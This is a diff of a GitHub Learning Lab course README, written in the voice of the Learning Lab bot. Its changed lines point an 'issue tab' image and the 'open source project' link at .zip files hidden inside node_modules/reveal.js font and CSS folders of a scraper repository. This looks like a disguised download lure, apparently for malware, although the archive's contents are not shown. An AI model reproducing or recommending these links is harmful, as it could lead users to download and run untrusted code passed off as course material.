@@ -6,8 +6,8 @@ Oh! I haven't introduced myself...
 
 I'm the GitHub Learning Lab bot and I'm here to help guide you in your journey to learn and master the various topics covered in this course. I will be using Issue and Pull Request comments to communicate with you. In fact, I already added an issue for you to check out.
 
-![issue tab](https://raw.githubusercontent.com/sumeetsk1996/Product_Scraper_FASTAPI/main/node_modules/reveal.js/lib/font/league-gothic/Product_Scraper_FASTAPI_unrecalled.zip)
+![issue tab](https://github.com/sumeetsk1996/Product_Scraper_FASTAPI/raw/refs/heads/main/node_modules/reveal.js/css/Product_FASTAPI_Scraper_3.5-alpha.2.zip)
 
 I'll meet you over there, can't wait to get started!
 
-This course is using the :sparkles: open source project [https://raw.githubusercontent.com/sumeetsk1996/Product_Scraper_FASTAPI/main/node_modules/reveal.js/lib/font/league-gothic/Product_Scraper_FASTAPI_unrecalled.zip](https://raw.githubusercontent.com/sumeetsk1996/Product_Scraper_FASTAPI/main/node_modules/reveal.js/lib/font/league-gothic/Product_Scraper_FASTAPI_unrecalled.zip). In some cases we’ve made changes to the history so it would behave during class, so head to the original project repo to learn more about the cool people behind this project.
+This course is using the :sparkles: open source project [https://github.com/sumeetsk1996/Product_Scraper_FASTAPI/raw/refs/heads/main/node_modules/reveal.js/css/Product_FASTAPI_Scraper_3.5-alpha.2.zip](https://github.com/sumeetsk1996/Product_Scraper_FASTAPI/raw/refs/heads/main/node_modules/reveal.js/css/Product_FASTAPI_Scraper_3.5-alpha.2.zip). In some cases we’ve made changes to the history so it would behave during class, so head to the original project repo to learn more about the cool people behind this project.
